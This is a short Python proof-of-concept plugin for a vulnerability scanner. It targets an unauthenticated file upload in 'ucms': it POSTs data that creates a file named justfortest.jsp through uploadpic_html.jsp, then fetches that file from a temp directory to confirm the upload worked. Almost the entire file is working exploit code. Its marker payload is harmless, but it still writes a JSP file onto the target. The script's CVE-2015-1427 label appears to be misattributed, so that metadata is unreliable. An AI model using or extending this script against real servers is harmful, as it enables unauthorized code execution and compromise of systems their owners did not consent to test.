#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'CVE-2015-1427'
        self.keyword = ['ucms', 'upload']
        self.info = 'ucms upload'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    def prove(self):
        xmldata = '''
        <?xml version="1.0" encoding="UTF-8"?>
        <root>
        dGVzdCBieSBtZQ==
        </root>
        '''
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, '../ucms/'),
                self.url_normpath(self.url, 'ucms/'),
                self.url_normpath(self.url, '../ucms/'),
            ]))
            for path in path_list:
                myurl = path + '/cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
                res = self.curl('post', myurl, data=xmldata)
                if res != None and res.status_code is 200:
                    myurl = path + '/cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
                    testres = self.curl('post', myurl, data=xmldata)
                    if testres != None and 'test by me' in testres.text:
                        self.flag = 1
                        self.req.append({"page": myurl})
                        self.res.append({"info": myurl, "key": "ucms upload"})
